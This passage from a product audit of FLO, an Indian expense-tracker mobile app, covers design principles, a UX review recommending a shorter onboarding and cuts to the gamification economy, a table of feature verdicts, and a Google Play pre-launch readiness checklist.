2. **One primary action per screen.** "Add transaction" is the app's verb, so it gets one consistent button. Everything else is secondary text or icon buttons.
3. **Restraint in colour.** Neutral greys carry 90% of the UI. Lime is the single brand colour, used only for fills, the primary button and selection, never as text on white. Red, amber and green carry meaning (over, near, income) and are never available as decoration.
4. **Platform chrome.** Native Stack headers, back gestures and a standard bottom bar. Use sheets with detents for add and edit, and native alerts only for destructive confirmations.
5. **Grouping by space, not boxes.** Flat lists with hairlines. Cards only for the hero and distinct objects. Three radii.
6. **Quiet feedback.** Pressed states on everything, a haptic on save, and no confetti for routine actions. Celebrate at most once a month (a report or a budget kept).
7. **System-native appearance.** Follow the OS light/dark setting by default, offer no accent picker, and support 200% font scale without clipping.
8. **Accessible by construction.** Shared `IconButton`, `Row` and `Button` components require a label, enforce 48dp and carry role and state, so screens cannot skip them.

The expected result: Home ≈ account switcher, balance, this month vs budget, recent transactions. Analytics ≈ one period control plus charts. Settings ≈ grouped rows. The current Personalize, Shop, Trophy, Streak and Rewards surfaces either go away or fold into one optional "Progress" screen, if check 1 keeps any of it.

---

## 5. UX: flows, onboarding and feature surface

> Source: UX audit. Its retention list is merged into §1. Plans are hidden for v1 rather than deleted (see the decisions table).

Scope: read-only review of `app/`, `components/`, `hooks/`, `lib/`, `.claude/features/`, `supabase/functions/send-push/`. No repo files changed.

Verdict in one line: **FLO is an expense tracker wrapped in a mobile game.** It takes about 25 taps and 15 screens to log the first expense. The Home header has five gamification controls before the user sees their money. A brand-new user gets a full-screen "rank unlocked" takeover for doing nothing. There is no analytics SDK, so nobody can measure any of this. The core loop (log an expense in under 5 seconds) is buried under the decoration.

---


### Onboarding: current map and tap count

#### Path to first logged expense (Google sign-up, skipping the optional balance step)

| # | Screen (route) | Taps | Configures something real? |
|---|---|---|---|
| 1 | `intro/opener`: "Hi there, I'm Koban!" | 1 (Dive In) | No |
| 2 | `intro/problem`: "where did it all go?" | 1 | No |
| 3 | `intro/solution`: "2 minutes a day" | 1 | No |
| 4 | `intro/name` | 2 + typing | Yes (display name, but Google provides it) |
| 5 | `intro/age` | 2 (select + Continue) | **No.** Stored "for analytics", but there is no analytics SDK |
| 6 | `intro/income` | 2 | Weakly: sizes the auto budget (`budget.js:81`) |
| 7 | `intro/goal` | 2 | **No.** Only feeds one phrase on `journey.js` |
| 8 | `intro/leak` | 2 | Weakly: picks the auto-budget category (`budget.js:65`) |
| 9 | `intro/habit` | 2 | **No.** Only feeds one note on `reminders.js:51` |
| 10 | `intro/reflection`: "We heard you" animation | 1 | No (echoes answers back) |
| 11 | `/sign-in?mode=signup` | 2 (Google + account picker) | Yes |
| 12 | `onboarding/account`: "Name your account" | 1 | Barely: renames "Personal" |
| 13 | `onboarding/currency` | 1 | Yes, but India-first means INR is the right default |
| 14 | `onboarding/categories` | 1 | Weakly: the preset is fine for 95% of users |
| 15 | `onboarding/balance`: "Let's fill your wallet" | 1 (skip) | Optional |
| 16 | `onboarding/expense`: **first expense** | ~3 + digits | **Yes, the activation moment** |

**About 25 taps plus typing, 16 screens, before the first expense.** Each select-style question costs 2 taps because nothing auto-advances (`intro/goal.js:42-44`). The `_layout.js` comment claims "an explicit skip on every screen". Apart from the tour, no screen has a skip-all (`grep skip` finds only `tour/[step].js:82`). The day-1 StreakCelebration then fires *mid-onboarding* by design (`StreakCelebration.js:97-106`), which adds a dismiss tap.

After the first expense, 4 more setup screens follow (budget, reports, reminders + OS permission dialog, journey), then 10 tour cards, the welcome bundle and done. On Home, `RankUpCelebration` immediately fires a full-screen "Saver unlocked" for a user with ~100 XP (`RankUpCelebration.js:57-72`, 92-100: null `highest_rank_seen` is treated as a crossing). The RewardBurst and possibly a TrophyToast come with it. **Total: about 32 screens and 3 to 4 celebrations before the user sees Home calmly.**

#### Screen-by-screen verdict (rule: every question must configure something real)

| Current screen | Verdict | Reason |
|---|---|---|
| intro/opener | **KEEP (merged)** | One screen: value prop + "Continue with Google" + "I have an account". Merge problem/solution copy into it |
| intro/problem | **CUT** | Rhetorical question; configures nothing |
| intro/solution | **CUT** (merge 1 line into opener) | Tagline, not a screen |
| intro/name | **CUT** | Google returns the name; email users can type it on the sign-up form, which already asks (`sign-in.js:68`) |
| intro/age | **CUT** | Nothing in-app reads `age_range`. "Durable for analytics" with no analytics is a survey tax |
| intro/income | **CUT** (DEFER) | Sensitive question at minute one, for India especially. Size a budget later from 2–4 weeks of real spend |
| intro/goal | **CUT** | Feeds one sentence on `journey.js` |
| intro/leak | **DEFER** | Ask in context the first time the user opens Budgets ("Which category do you want to watch?") |
| intro/habit | **CUT** | Feeds one sentence on `reminders.js` |
| intro/reflection | **CUT** | Animation echoing answers that no longer exist |
| sign-in (signup) | **KEEP, simplify** | Google first and alone; email behind "Other options" |
| onboarding/account | **CUT** | Default "Personal"; rename lives in Accounts |
| onboarding/currency | **CUT** (auto-default) | Default from device locale (INR for `en-IN`), editable in Settings. Only show the screen if the locale is non-INR |
| onboarding/categories | **CUT** | Seed the preset silently; Manage Categories exists |
| onboarding/balance | **CUT / DEFER** | Balance is a second-week concern; offer "Set starting balance" on the account card |
| onboarding/expense | **KEEP: the core of onboarding** | But use the real AddTransactionSheet, not the forked second implementation (`expense.js:32-33` admits the fork). One entry form to tune |
| onboarding/budget | **DEFER** | Auto-creating a budget from guessed income + guessed leak is a fake commitment. Suggest a real one after 14 days of data |
| onboarding/reports | **CUT** | Default weekly; it's a Settings toggle |
| onboarding/reminders | **KEEP, move** | Ask for notification permission *right after* the first expense is saved: "Want a nudge at 9 pm if you haven't logged?" One screen with a time chip. Don't frame it as "Never miss a bill" for a user with zero bills |
| onboarding/journey | **CUT** | Marketing interstitial; "Almost there" adds a screen to say there's more screens |
| tour (10 cards) | **CUT** | A tour of the menu is a confession the IA is too big. Replace it with 1–2 contextual coach marks on Home (the + button, then the streak chip after the first log) |
| welcome-bundle | **CUT** | 1,000 coins + 2 freezes + a card theme as a sign-up reward only makes sense if the economy stays. It shouldn't (see P1-5) |
| done | **MERGE into the expense save** | The confirmation after the first expense *is* "you're all set" |
| Immediate rank-up popup | **CUT** | Suppress the rank celebration until the first genuine rank-up (Saver → Bookkeeper). Set `highest_rank_seen = 'saver'` at sign-up |

#### Target flow: 4 screens, about 6 taps to first value

1. **Opener**: one line of value ("Know where every rupee goes, 5 seconds a day") + **Continue with Google** + small "Other options / I have an account".
2. **Google account picker** (system).
3. **First expense**: the real Add sheet, pre-opened over an empty Home. Amount autofocused, top-6 Indian everyday categories as a grid (Food, Groceries, Transport, Shopping, Bills, Other). Optional "Not now".
4. **Saved → reminder ask**: "Logged. Want a 9 pm nudge if you haven't logged?" [Turn on] / [Not now], which triggers the OS permission → Home.

Everything else is defaulted (account "Personal", currency from locale, preset categories, weekly report on) or asked in context later (budget after 14 days, bills when the first recurring-looking expense appears, Plans/Splits on first visit).

**Stronger variant (recommended to evaluate): expense before sign-up.** Use Supabase anonymous sign-in (`supabase.auth.signInAnonymously()`) on first open. The user logs immediately and is asked to link Google after the first expense, or on day 2 ("Back up your entries"). RLS keeps working because the anonymous user has a real `auth.uid()`. Risk: orphaned anonymous rows. Cap them with a cleanup job. This turns the funnel into open → log → link, which is the strongest activation shape for a habit app.

---

### UX items

#### [P0] Add product analytics before changing anything else
**Problem:** `package.json` has no analytics dependency. The only "analytics" in the codebase is the Analytics *screen*. `age_range` is collected "for analytics" (`lib/onboarding.js:51`) with nowhere to send it. Today there is no way to know onboarding drop-off, D1/D7, or whether gamification moves anything.
**Change:** Add PostHog React Native (Expo-compatible, funnels and retention cohorts included), or a minimal `events` table in Supabase written by a `track()` helper in `lib/`. Minimum event set:
- `app_open`, `onboarding_step_viewed {step}`, `onboarding_completed`, `signup_completed {method}`
- `transaction_logged {source: sheet|share|notification|onboarding, seconds_to_save, category_was_default}`
- `reminder_sent/opened` (server side in send-push), `share_import_received {parsed: bool}`
- `celebration_shown {kind}`, `celebration_dismissed_ms`

Metrics to watch:
- **Activation:** first expense within 10 minutes of install (target >60%).
- **D1/D7/D30** retention on "logged ≥1 tx".
- **Logs per active day** and **active days per week**.
- **Median seconds-to-save** in the Add sheet.
- **% of logs where the default category was kept** (measures the smart default).
- **Push → log conversion within 30 min**.

Mind DPDP Act consent: no amounts or notes in events.
**Priority rationale:** Every other recommendation here is a bet. Without this you can't tell which ones paid off, and the store launch is the one moment you get clean cohorts.

#### [P0] Collapse onboarding to the 4-screen target flow
**Problem:** About 32 screens, about 25 taps to the first expense. 6 of 10 intro questions configure nothing (table above). Two-tap MCQs with no auto-advance. No global skip despite the layout comment. A forked second transaction form (`app/onboarding/expense.js`, 458 lines) duplicates `AddTransactionSheet`.
**Change:** Implement the target flow. In `lib/onboarding.js`, reduce `INTRO_STEPS` to `[opener]` and `STEPS` to `[expense, reminders]`, and delete `TOUR_STEPS`/`BUNDLE_ROUTE`. Seed account/currency/categories/report-cadence with defaults in `finish()` or on profile creation. Delete the orphan screens (problem, solution, name, age, income, goal, leak, habit, reflection, account, currency, categories, balance, budget, reports, journey, tour, welcome-bundle, done) and `lib/onboardingDraft.js`'s durable-answers flush. Replace `onboarding/expense.js` by opening the real Add sheet. Use the flo-feature skill and update feature 12/28 docs per the workflow.
**Priority rationale:** Onboarding drop-off is the single largest leak in any consumer finance app, and every screen cut here costs you users before they have seen any value. This is also the trim the owner already asked for.

#### [P0] Speed up the Add sheet (the core loop)
**Problem:** In `components/AddTransactionSheet.js`:
- The default category is alphabetical-first (`useCategories.js:25` `.order('name')`, sheet `:228`), so most saves need a category change.
- Categories are a horizontal scroll row (`:660`). Off-screen categories need a swipe to find.
- The sheet carries Expense/Income/Transfer, Account, Date, Plan, Split and Note on one 92% sheet (`:487`). That is 7 controls around a 2-field task.
- `number-pad` (`:585`) has no decimal key on Android. Fine for INR, but there is no quick ₹ formatting/feedback.
- After the first save of the day: a RewardBurst (`:418`), plus possible budget/plan toasts (`lib/alerts`), plus possible streak/rank/trophy modals.

Current best case: + → digits → (dismiss keyboard / scroll) → category → Save. That is 4–5 taps, often 6.
**Change:**
- Default category = the user's most-used category at this time of day (last 30 days), else most-used overall. Show the top 8 as a 4×2 grid directly under the amount, with "More" for the rest.
- Keep Save pinned above the keyboard so amount + category + Save never needs a keyboard dismiss.
- Collapse Date/Plan/Split/Note/Account behind one "Details" row (date chips "Today / Yesterday" inline).
- Move Transfer out of the type toggle (Free tier has 1 account, so Transfer shows an upsell for most users, `:156-162`). Put it on the account card instead.
- Optional "Save & add another".
- Show the reward/celebration only after the sheet closes, and only per the moment queue.

Target: **+ → digits → Save = 3 taps when the default is right, 4 when it isn't**, median under 5 s (instrument `seconds_to_save`).
**Priority rationale:** Logging speed is the retention driver for manual trackers. Every daily log pays this cost, so it compounds more than any feature.

#### [P0] Stop the new-user celebration pile-up; build a moment queue
**Problem:** Six independent surfaces mounted at root (`app/_layout.js:433-437`) plus a per-screen RewardBurst:
- `DueBillsModal` (daily, AsyncStorage-gated)
- `StreakCelebration` (day 1 + milestones, then chains into `MilestoneSpinWheel`, a *second* full-screen modal, `StreakCelebration.js:60-66`)
- `FreezePrompt` (daily)
- `RankUpCelebration` (full-screen)
- `TrophyToast`
- `RewardBurst` (coin/XP overlay)

They coordinate only through ad-hoc `isBursting` deferrals in two of them. Nothing stops DueBills + FreezePrompt + RankUp from all wanting the same Home mount. A brand-new user gets RankUp "Saver" (a rank for existing) right after onboarding, plus the burst, plus a likely first-log trophy.
**Change:** Add a `MomentQueueProvider` in `lib/`, sibling to `ToastProvider`. Each moment source `enqueue({kind, priority, payload})`s instead of rendering its own Modal. The queue shows one at a time, ordered by priority: blocking/actionable (FreezePrompt to save a streak, DueBills) above celebratory (streak milestone) above ambient (trophy, rank).
- **Frequency caps:** at most 1 full-screen takeover per app session and at most 2 per day. Ambient items collapse into a single toast or a dot.
- Never during onboarding, and never while the Add sheet is open.
- Suppress RankUp for `saver`.
- Fold the spin wheel into the milestone screen, or cut it.
**Priority rationale:** Modal fatigue teaches users to tap-dismiss without reading. It also makes the app feel like a slot machine, the opposite of "serious money app". It is also a source of real bugs (the code comments document three collision fixes already).

#### [P1] Ship share-to-FLO import as the fast path (Android)
**Problem:** `expo-share-intent` + `lib/smsParser.js` are built, but `03-sms-share-import.md` is still "awaiting on-device verification" for Phases 1 and 3. The handler only pre-fills amount/type, or dumps the whole SMS into the note when parsing fails (`app/_layout.js:67-68`). Category and merchant remain manual, so a share is barely faster than typing.
**Change:**
- Verify on device with real SBI/HDFC/ICICI/Axis/Kotak debit SMS and UPI app receipts (GPay/PhonePe/Paytm "Paid to X" text shares).
- Extract payee/merchant (`to VPA xyz@okaxis`, `at SWIGGY`).
- Persist a `merchant_rules` (payee → category_id) table learned from the user's own corrections, so the second share from Swiggy is a one-tap confirm. It's deterministic, not AI.
- Show "Saved from SMS" as a source tag.
- Teach it once: after the first manual log, show "Tip: long-press a bank SMS → Share → FLO".

iOS later via a Share Extension.
**Priority rationale:** In India nearly every spend generates a bank SMS or UPI receipt. Turning "remember and type" into "share and confirm" is the biggest logging-speed gain available within store policy (unlike auto-detect).

#### [P1] Defer the account wall: Google-only first, anonymous-first as a follow-up
**Problem:** The account is created at intro screen 11. `sign-in.js` signup mode leads with email + password (+ first/last name when no draft name), with Google as the secondary button (`:260-287`).
**Change:** Phase A (now): Google as the primary and only visible CTA on the opener, with email under "Other options". Phase B: Supabase anonymous auth so the first expense happens before any account, then a "Back up your entries with Google" prompt after the first log or on day 2, and a blocking prompt before reinstall-risky actions (export, second device).
**Priority rationale:** Removes the biggest single drop-off step. Phase A is cheap; Phase B needs RLS/identity-linking testing, so it comes second.

#### [P1] Make the Home header about money, not currency of a game
**Problem:** The header carries a coins/freezes/level chip, a streak chip, a Trophy button, a Shop button and a Bell (`app/(tabs)/index.js:189-250`). That is 5 controls, 4 of them gamification. Then come the greeting, the account carousel, `ReportReadyCard`, `TodayCard`, the chart, upcoming bills, and finally Recent Transactions.
**Change:** Header = streak chip + bell. Body order:
1. "Spent this month" hero, with "left of budget" if a budget exists.
2. Today strip (logged / not logged, + button).
3. Recent transactions.
4. Upcoming bills (only if any).
5. Weekly recap card (Mondays).

Move the chart to Analytics. Move Trophies/Shop/coins out of Home (see feature table).
**Priority rationale:** Home is seen every session. It should answer "how am I doing this month" in one glance and make + the obvious next action.

#### [P1] Replace the coin/XP/rank/trophy/freeze/spin/shop economy with streak + one freeze
**Problem:** The economy has many moving parts (`lib/rewards.js`, `lib/coins.js`, `lib/trophies.js`, `lib/cardThemes.js`):
- daily 25 coins + 100 XP
- 9 ranks with badge art
- trophy groups (streak, logger, perfect month, categorizer, comeback, fresh start, frugal, planner, budget)
- 12 streak milestones, each with a spin wheel
- freezes at 3,000 coins, capped at 5
- ~50 card themes in 7 tiers
- 6 real-money coin packs (₹49–₹999)

These are features 18–25 and 27: about a third of all feature docs. The freeze price was deliberately set so that "no single affordable pack buys a freeze" (`rewards.js:40-45`). That is monetisation design aimed against the user, in a money-management app. Neither Pro nor the coin packs are purchasable (`app/pro.js:26-31` toast "Payments aren't live yet"), so the store is a dead end today.
**Change:** For v1 keep:
- The **streak** (header chip + streak screen calendar).
- **One freeze** earned automatically per 7-day streak (max 2), applied automatically with a "We saved your streak" note.
- Milestone moments at 7/30/100 only.

Cut from v1 (feature-flag off, keep the code if you want it later):
- coins, XP/ranks, trophies, spin wheel, Shop, coin packs, card-theme tiers, welcome bundle, RewardBurst, RewardsHistory.

Personalization collapses to Light/Dark + 4–6 accents in Settings.
**Priority rationale:** The economy competes with the money for attention and adds 5 extra surfaces and 3 modals. It also signals "game" to the serious users who are most likely to stick with an expense tracker. Real-money coin packs in a finance app are a review and trust risk. Keep the one mechanic with a proven habit link (the streak).

#### [P1] Reminder cadence: one adaptive evening nudge + weekly recap
**Problem:** `send-push/index.ts:226-251` sends a morning push every day regardless of state, plus an evening push if not logged. Defaults come from onboarding with no user choice of time beyond Settings. Bill reminders are a third stream, and reports a fourth. Settings shows both "Notifications" and "Push notifications" rows (`app/settings.js:512, 597`), which is confusing.
**Change:**
- Default = a single evening nudge at 21:00 local, only if nothing was logged today.
- After 3 consecutive ignored nudges, drop to every other day. After 7, stop daily and send only the weekly recap.
- Resume daily on the next log.
- Morning push: off by default, opt-in.
- Weekly recap push Monday 09:00.
- Bill reminders only for bills that exist.
- One "Notifications" section in Settings with three toggles: Daily nudge (time), Weekly recap, Bill reminders.

Copy in `lib/reminderCopy.js` is good (no shaming); keep it.
**Priority rationale:** Two pushes a day to a user who isn't engaging gets the app's notifications disabled or the app uninstalled. Conditional, decaying nudges protect the channel you need for D7/D30.

#### [P1] Weekly insight as the retention hook (rule-based)
**Problem:** Reports (`app/report.js`, 731 lines, feature 11) and Analytics (`app/(tabs)/analytics.js`, 678 lines, 3 segments) overlap. Reports are opt-in via onboarding and reached via Menu → Reports or a `ReportReadyCard`.
**Change:** One weekly recap screen: total vs last week, top 3 categories with deltas, one plain rule-based observation ("Food up 32% vs your 4-week average"), and the streak. Push it Monday morning and show it as the Home card that week. Monthly is the same template. Analytics stays as the exploration tab. Merge `report.js` into Analytics as a "Weekly / Monthly" period preset with the recap at the top, and make CSV export a Pro action there.
**Priority rationale:** A reason to open the app that isn't "go do a chore". It rewards the logging habit with information, which is the actual product.

#### [P2] Trim the feature surface and IA to a lean v1
**Problem:** Reachable surfaces: 3 tabs + Add + Menu (Plans, Splits, Budgets, Reports, Bills, Settings, Upgrade) + header Trophy/Shop/Rewards + Streak + Personalize + Manage Categories + Alerts + Accounts/Transfers + Join-split invites. Plans, Budgets and Splits overlap in concept ("money set aside / money limited / money shared"). Plans also carry a "collecting" mode that silently defaults new expenses into a plan (`AddTransactionSheet.js:236-242`). 72 components and 31 hooks for an app whose core is one form and one list.
**Change:** Lean v1 IA:
- **Tabs:** Home · Transactions · (+) · Insights (Analytics + weekly/monthly recap) · More.
- **More:** Budgets, Bills, Splits, Accounts, Categories, Settings (Appearance, Notifications, Export, Account), Pro.
- **Cut / defer:** Plans (merge "save toward a goal" into a later Goals feature or drop), Plans "collecting" mode, Trophies, Shop, Rewards hub, spin wheel, card themes, Personalize hub (fold into Settings → Appearance), the tour.

Details in the feature table below.
**Priority rationale:** Fewer destinations = less to explain (no tour needed) and less to test. Pro limits stay clear (accounts, budgets, splits, full reports).

#### [P2] Contextual setup instead of upfront questions
**Problem:** Budget/leak/income are asked at minute one, so the auto-budget is built from guesses (`app/onboarding/budget.js`). Empty states for Budgets/Plans/Bills are one grey line.
**Change:** Trigger setup prompts from data:
- After 14 days of logs: "Your Food spend is ~₹8,400/month. Set a ₹8,000 limit?" (one tap).
- When the same payee/amount recurs monthly: "Track this as a bill?"
- Budgets empty state = that suggestion card, not text.
**Priority rationale:** Converts setup from a survey into something that is visibly useful at the moment it is asked.

#### [P2] Home-screen widget (Android)
**Problem:** Every log requires opening the app and tapping +. There is no glanceable surface outside the app.
**Change:** A 2×1 Android widget: "Today ₹X · Streak N" + a "+" that deep-links to the Add sheet (route param → `openAdd()`). It needs a native module (e.g. a config plugin with `react-native-android-widget`) and a dev-client build. iOS WidgetKit later.
**Priority rationale:** High-leverage for daily loggers, but native work. Do it after the P0/P1 items prove the loop.

#### [P3] Remove dev-only and dead onboarding scaffolding
**Problem:** `OnboardingDevBack` renders in the root stack (`app/_layout.js:449`). The orphaned detect screen is noted in `lib/onboarding.js:14-17`. `lib/onboarding.js`'s back-route walker exists for testers.
**Change:** Delete it when onboarding shrinks. Ensure the dev back button is gated on `__DEV__`.
**Priority rationale:** Hygiene. Low user impact but it reduces surface for bugs.

---

### Feature-surface verdicts

| Feature | Where | Verdict | Note |
|---|---|---|---|
| Add transaction (expense/income) | `+` / `AddTransactionSheet` | **KEEP-CORE** | Speed it up (P0) |
| Transactions list + search | tab | **KEEP-CORE** | |
| Home summary | tab | **KEEP-CORE** | Money-first layout (P1) |
| Analytics | tab | **KEEP-CORE** | Rename "Insights", absorb Reports |
| Reports (weekly/monthly) | Menu → `/report` | **MERGE → Insights** | Recap + push; CSV export as Pro |
| Streak + streak calendar | header → `/streak` | **KEEP-CORE** | The one gamification mechanic kept |
| Freezes | Shop / FreezePrompt | **SIMPLIFY** | Auto-earned, auto-applied, max 2; no purchase |
| Daily reminder push | send-push | **KEEP-CORE, change cadence** | One adaptive evening nudge |
| SMS/UPI share import | share intent | **KEEP-CORE (finish it)** | Merchant → category rules |
| Budgets | Menu → `/budgets` | **KEEP-SECONDARY** | Data-suggested creation |
| Budget period outcomes (26) | budget detail | **KEEP-SECONDARY** | Fine inside budget detail |
| Bills + bill reminders | Menu → `/bills`, DueBillsModal | **KEEP-SECONDARY** | DueBillsModal goes into the moment queue; reminders only if bills exist |
| Accounts (multi) | carousel / switcher | **KEEP-SECONDARY** | Free = 1; hide the carousel chrome when there's 1 account |
| Transfers | Add sheet tab | **KEEP-SECONDARY, move** | Off the type toggle; show only with 2+ accounts |
| Splits + invites | Menu → `/splits` | **KEEP-SECONDARY** | Real Indian use case (trips, flatmates). Keep, but keep it out of the Add sheet until a split exists |
| Plans | Menu → `/plans` | **CUT for v1 (or DEFER)** | Overlaps Budgets (limit) and Splits (shared); "save toward a goal" is a later Goals feature |
| Plans collecting mode (09) | Add sheet default | **CUT** | Silently routes new expenses into a plan; surprising |
| Manage categories | Settings | **KEEP-SECONDARY** | |
| Summary period reset (30) | Settings | **KEEP-SECONDARY** | Useful for salary-date months in India |
| Export CSV | Reports | **KEEP-SECONDARY (Pro)** | |
| Pro / Upgrade | Menu, `/pro` | **KEEP, but hide until payments are live** | Today it toasts "Payments aren't live yet" |
| Alerts sheet (bell) | header | **KEEP-SECONDARY** | Merge budget/plan toasts into it rather than toasting on save |
| Coins | header chip, everywhere | **CUT** | |
| XP / ranks (9) / RankUpCelebration | header chip, modal | **CUT** | |
| Trophies + TrophyToast | header → `/trophies` | **CUT (DEFER-POST-LAUNCH)** | |
| Milestone spin wheel (20) | after streak celebration | **CUT** | |
| Rewards hub / history sheet (25) | header chip | **CUT** | |
| Shop + coin packs (22) | header → `/shop` | **CUT** | Real-money coins in a finance app is a trust/review risk |
| Card themes (~50, 7 tiers) (19) | Shop / Personalize | **CUT to 0–3 free designs** | |
| App themes: 23 accents × light/dark (16) | Personalize | **SIMPLIFY → 4–6 accents + Light/Dark/System** | In Settings → Appearance |
| Personalize hub (23) | Settings | **MERGE → Settings / Appearance** | |
| Welcome bundle (28) | onboarding | **CUT** | |
| Onboarding tour (28) | onboarding | **CUT** | Replace with 1–2 coach marks |
| TodayCard / no-spend ritual | Home (evening) | **SIMPLIFY** | Keep a "No spend today" one-tap that counts toward the streak; drop the receipt/XP framing |
| Koban mascot | onboarding, celebrations | **KEEP light** | Fine as brand on the opener + empty states; not a narrator across 30 screens |
| Auto-detect (06) | Settings | **Personal build only** | Excluded from the store build (standing rule) |

#### Overlaps, named

- **Plans vs Budgets vs Splits:** three containers for "where this money belongs". Budgets = a limit on spend. Splits = who owes whom. Plans = a goal *and* a spend bucket *and* a collecting default. Keep Budgets and Splits; Plans has no job the other two don't do in v1.
- **Reports vs Analytics:** same data (`11-reports.md` says "~70% assembly of existing parts"). One Insights tab with period presets and a recap header.
- **Bills vs reminders:** Bills have their own local reminders, DueBillsModal, a Home section *and* a push stream. Keep bills; route all bill nudges through one push setting and the moment queue.
- **Economy vs streak:** coins, XP, ranks, trophies, freezes, spin wheel, shop and card themes all reward the same act (log once a day) as the streak. One counter is clearer than eight.

#### Lean v1 IA

```
Tabs:  Home | Transactions | (+) | Insights | More
Home:  Spent this month (+ budget left) · Today strip · Recent · Upcoming bills · Weekly recap card
       Header: streak chip, bell
Insights: Week / Month / Custom · recap header · categories · trend · Export (Pro)
More:  Budgets · Bills · Splits · Accounts · Categories · Settings (Appearance, Notifications, Summary period, Account) · Pro (when live)
```

---

### Retention mechanics: evaluation

- **Streak:** Good, and correctly built on `created_at` (backfills count). Celebration is properly limited to day 1 + milestones (`StreakCelebration.js:72-81`). But 12 milestones up to 1,000 and a spin wheel on each is too much; 7/30/100 is enough.
- **Reminders:** The copy is the best part (no shaming, state-aware). The cadence is the problem: an unconditional morning push and no decay (P1).
- **Koban copy:** Warm voice rules in `lib/koban.js` are sound. The issue is volume. Koban narrates 30 onboarding screens and every celebration. Keep him for the opener, empty states and milestone moments.
- **Gamification economy:** It distracts more than it drives. The earn rate (25 coins/day) against prices (3,000 per freeze) makes the currency meaningless for months. The real-money coin packs make it feel extractive. Nothing in it makes *logging* faster or more informative. Without analytics there's no evidence it lifts D7. Cut it, then measure the streak alone.
- **Reports:** Valuable but hidden. Make the weekly recap the hook (P1).
- **Empty states:** One grey line each. Turn them into suggestion cards with a prefilled one-tap action (P2).

What actually drives daily logging for an Indian expense tracker, in order:
1. Speed of entry: 3 taps, a smart category.
2. Share-import from bank SMS / UPI receipts with merchant memory.
3. One well-timed, conditional evening nudge.
4. A home-screen widget with a + button.
5. A weekly "here's where it went" recap.
6. A visible streak with forgiving freezes.

Points, ranks and shops are not on that list.

---

## 6. Google Play pre-launch readiness

> Source: Play pre-launch audit (expo-doctor, merged manifest, Play Console Help checked 2026-10-18). Includes the 11-step launch sequence.

Read-only audit, 2026-10-18. Commands run: `npx expo config --type public`, `npx expo install --check`, `npx expo-doctor`, an ELF-alignment check on the last local release APK (`android/app/build/outputs/apk/release/app-release.apk`, built 2026-08-27, a **full** build with auto-detect), and a read of its merged manifest and `manifest-merger-release-report.txt`. Play rules were checked against developer.android.com and Play Console Help on 2026-10-18. Labels: **Verified** means I checked it here. **Unverified** means it needs a Console, EAS or Supabase login, or a fresh build.

### Status at a glance

| Area | Status |
|---|---|
| Package name | FAIL: `com.anonymous.flo` (placeholder) |
| App name / icon / adaptive icon | OK: "FLO", 1024px icon, adaptive foreground + background |
| Monochrome (themed) icon | MISSING |
| Splash | OK (top-level `splash`, legacy form) |
| Versioning | RISKY: `appVersionSource: local` + `autoIncrement`, versionCode 2 |
| AAB via EAS | OK: `lite` profile builds an `app-bundle` |
| Env vars in EAS build | FAIL (likely): Supabase URL/key live only in the gitignored `.env` |
| Play App Signing / upload key | NOT SET UP (unverified, needs `eas credentials`) |
| Target SDK | OK: merged manifest targets **36**, min 24. Play requires 36 for new apps from 2026-08-31 |
| 16 KB page size | OK: all 20 arm64 `.so` have `p_align` 16384 and are stored uncompressed |
| R8 / resource shrinking | OFF. APK 110 MB; 50 MB of PNG assets |
| Permissions | Mostly clean. CAMERA unused; no exact alarms, no foreground services, no READ_MEDIA_* |
| Auto-detect exclusion in `lite` | Works on paper, NEVER verified in a built `lite` artifact |
| Privacy policy | MISSING |
| Account deletion | In app: YES (`delete_current_user`). Web URL: MISSING |
| Crash reporting | NONE |
| Payments | Stubbed (toast). Prices are shown in the UI |
| Closed test (12 testers × 14 days) | NOT STARTED |
| expo-doctor | 2 failures: invalid `android.androidNavigationBar` key; duplicate `expo-constants` and `expo-linking` (from expo-share-intent 5.0.0) |

---

### P0: Play will reject or block

#### [P0] Package name is the Expo placeholder `com.anonymous.flo`
**Problem:** `app.json` → `android.package: "com.anonymous.flo"`. `google-services.json` (Firebase project `flo26-7de68`) is registered to the same package. The local module's Kotlin namespace is also `com.anonymous.flo.detect` (that one only matters for `full`). The package name is permanent once an app exists in Play Console, and a placeholder looks like a template app.
**Change:** Pick a real reverse-domain id you control (for example `in.<yourdomain>.flo` or `com.<yourname>.flo`) and set it before the first upload, because it can never change afterwards. Then:
- add a new Android app with that package in Firebase and replace `google-services.json`;
- re-upload the FCM V1 service-account key to EAS (`eas credentials`) so Expo push still works;
- reinstall on test phones (the package change breaks upgrades).

The Supabase redirect uses the `flo://` scheme, so it is unaffected.
**Priority rationale:** You cannot change it after the app is created in the Console, and push breaks if Firebase isn't re-registered.

#### [P0] Supabase env vars will not reach the EAS cloud build
**Problem:** `lib/supabase.js` reads `process.env.EXPO_PUBLIC_SUPABASE_URL/ANON_KEY`. They are defined only in `.env`, which is in `.gitignore`. There is no `.easignore`, so EAS uploads the git-filtered tree and the build gets `undefined`. `createClient` then throws at boot, and every pre-launch-report device logs a crash. **Unverified:** EAS project environment variables may already be set. Check with `eas env:list`.
**Change:** `eas env:create` for both variables in the `production` and `preview` environments (visibility "plain text" is fine; the anon key is public). Add `"environment": "production"` to the `production` profile in `eas.json`.
**Priority rationale:** An app that crashes on launch fails review and the pre-launch report.

#### [P0] Privacy policy URL does not exist
**Problem:** There is no privacy policy anywhere (repo, docs, in-app). Play requires one for every app, and especially for apps with accounts or financial data. It must be a public, non-PDF, non-geofenced URL. It must also be linked inside the app.
**Change:** Publish a policy (GitHub Pages, Notion public page, or a Supabase-hosted static page). It should name:
- the data collected (see the Data safety item);
- the processors: Supabase (hosting, DB, auth, storage), Expo push service, Google Firebase Cloud Messaging, Google OAuth;
- retention and deletion;
- a contact email.

Link it in Play Console → App content and in Settings → About/Legal. India's DPDP Act 2023 also expects a grievance contact; include one.
**Priority rationale:** It is a hard Console blocker. You cannot submit to any track that needs review without it.

#### [P0] No web URL for account deletion
**Problem:** In-app deletion exists and works: Settings → `deleteAccount()` → `delete_current_user()` RPC, with cascade FKs and avatar removal. **Verified** in code. Play also requires a **web link** where a user who uninstalled the app can request deletion. The Data safety form will not complete without it.
**Change:** Publish a simple page, either in the privacy-policy site or as a section of it, with these steps:
1. Email X from your account address, or
2. Open the app → Settings → Delete account.

It must also state what is deleted and on what timeline (immediate cascade). An email-request flow is acceptable.
**Priority rationale:** The Data safety form is mandatory, and this question is a required field.

#### [P0] Data safety form: what to declare
**Problem:** The form is not filled in, and it must match what the app actually does.
**Change:** Declare the following (my reading of the code; confirm against the final build).

**Collected** (all "required" unless marked optional):
- Personal info: **Name**, **Email address**, **User IDs** (Supabase auth id).
